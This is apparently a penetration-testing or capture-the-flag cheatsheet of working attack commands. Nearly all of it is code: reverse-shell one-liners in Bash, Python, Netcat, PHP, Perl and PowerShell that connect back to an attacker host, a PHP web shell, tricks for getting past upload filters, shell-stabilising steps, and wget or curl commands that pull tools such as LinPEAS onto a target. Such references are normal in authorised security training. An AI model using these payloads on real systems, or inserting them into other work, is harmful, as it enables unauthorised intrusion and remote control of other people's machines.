# Shells Cheatsheet

---

## Listeners

```bash
# Standard
nc -lvnp 4444

# rlwrap gives you arrow keys and history (use this by default)
rlwrap nc -lvnp 4444
```

---

## Reverse Shells (pick based on what's available on target)

```bash
# Bash
bash -i >& /dev/tcp/<LHOST>/4444 0>&1

# Bash (alternative if above fails)
bash -c 'bash -i >& /dev/tcp/<LHOST>/4444 0>&1'

# Python3
python3 -c 'import socket,subprocess,os;s=socket.socket();s.connect(("<LHOST>",4444));os.dup2(s.fileno(),0);os.dup2(s.fileno(),1);os.dup2(s.fileno(),2);subprocess.call(["/bin/sh","-i"])'

# Python2
python -c 'import socket,subprocess,os;s=socket.socket();s.connect(("<LHOST>",4444));os.dup2(s.fileno(),0);os.dup2(s.fileno(),1);os.dup2(s.fileno(),2);subprocess.call(["/bin/sh","-i"])'

# Netcat (classic)
nc -e /bin/sh <LHOST> 4444

# Netcat (if -e flag not available)
rm /tmp/f; mkfifo /tmp/f; cat /tmp/f | /bin/sh -i 2>&1 | nc <LHOST> 4444 > /tmp/f

# PHP (one-liner, useful if you can inject into a parameter)
php -r '$sock=fsockopen("<LHOST>",4444);exec("/bin/sh -i <&3 >&3 2>&3");'

# Perl
perl -e 'use Socket;$i="<LHOST>";$p=4444;socket(S,PF_INET,SOCK_STREAM,getprotobyname("tcp"));connect(S,sockaddr_in($p,inet_aton($i)));open(STDIN,">&S");open(STDOUT,">&S");open(STDERR,">&S");exec("/bin/sh -i");'

# PowerShell (Windows)
powershell -nop -c "$client = New-Object System.Net.Sockets.TCPClient('<LHOST>',4444);$stream = $client.GetStream();[byte[]]$bytes = 0..65535|%{0};while(($i = $stream.Read($bytes, 0, $bytes.Length)) -ne 0){;$data = (New-Object -TypeName System.Text.ASCIIEncoding).GetString($bytes,0, $i);$sendback = (iex $data 2>&1 | Out-String );$sendback2 = $sendback + 'PS ' + (pwd).Path + '> ';$sendbyte = ([text.encoding]::ASCII).GetBytes($sendback2);$stream.Write($sendbyte,0,$sendbyte.Length);$stream.Flush()};$client.Close()"
```

---

## PHP Web Shells (upload to server)

```php
<!-- Full featured — PentestMonkey (get from revshells.com) -->

<!-- Simple one-liner if you just need RCE -->
<?php system($_GET['cmd']); ?>

<!-- Use it like: http://<IP>/shell.php?cmd=whoami -->
```

**Bypass upload filters:**
- Try `.php5`, `.phtml`, `.phar`, `.php3` if `.php` is blocked
- Change `Content-Type` to `image/jpeg` in Burp if it checks MIME type

---

## Upgrading a Dumb Shell to a Full TTY

A dumb shell has no tab complete, no arrow keys, Ctrl+C kills it. Always upgrade.

### Method 1 — Python3 (most common)

find / -name "user.txt" 2>/dev/null

```bash
# On the target
python3 -c 'import pty;pty.spawn("/bin/bash")'
export TERM=xterm
stty rows 38 columns 116
Ctrl+Z
stty raw -echo; fg

```

### Method 2 — Python2 (if python3 not available)

```bash
python -c 'import pty;pty.spawn("/bin/bash")'
# then same steps as above
```

### Method 3 — script (if no python)

```bash
script /dev/null -c bash
# then same Ctrl+Z + stty raw -echo + fg
```

### Method 4 — socat (best TTY, requires socat on target)

```bash
# On your machine (listener)
socat file:`tty`,raw,echo=0 tcp-listen:4444

# On target
socat exec:'bash -li',pty,stderr,setsid,sigint,sane tcp:<LHOST>:4444
```

---

## Check What's Available on Target

```bash
which python python2 python3 perl ruby nc ncat socat wget curl
```

---

## Transferring Files to Target

Sometimes you need to get LinPEAS or a shell script onto the box.

```bash
# On your machine — start HTTP server
python3 -m http.server 80

# On target — download the file
wget http://<LHOST>/file.sh
curl http://<LHOST>/file.sh -o file.sh

# Make it executable
chmod +x file.sh
```

---

## Quick Reference

| Situation | Use |
|-----------|-----|
| Default listener | `rlwrap nc -lvnp 4444` |
| Bash available on target | bash reverse shell |
| No bash, has python | python3 reverse shell |
| Web app, need RCE | PHP PentestMonkey from revshells.com |
| Got shell, need TTY | `python3 -c 'import pty;pty.spawn("/bin/bash")'` + stty |
| Windows target | PowerShell reverse shell |
| Need best shell quality | socat |
